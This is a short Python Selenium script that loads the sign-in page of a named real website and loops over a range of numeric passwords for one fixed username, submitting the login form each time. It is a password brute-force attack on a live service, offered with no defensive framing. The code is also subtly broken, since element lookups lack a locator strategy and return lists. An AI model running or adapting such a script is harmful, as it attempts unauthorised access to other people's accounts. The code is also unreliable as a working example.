from selenium import webdriver
url = "https://tulasoftware.com/users/sign_in"
driver= webdriver.Chrome("G:\SETUPS\APPS SETUP\chromium driver\chromedriver")
for i in range (1000000,1000100):
    username= "12345678"
    password= i


    driver.get(url)
    driver.find_elements("user[email]").send_keys(username)
    driver.find_elements("user[password]").send_keys(password)
    driver.find_elements("commit").click()
    print (f"type{i} checked.")

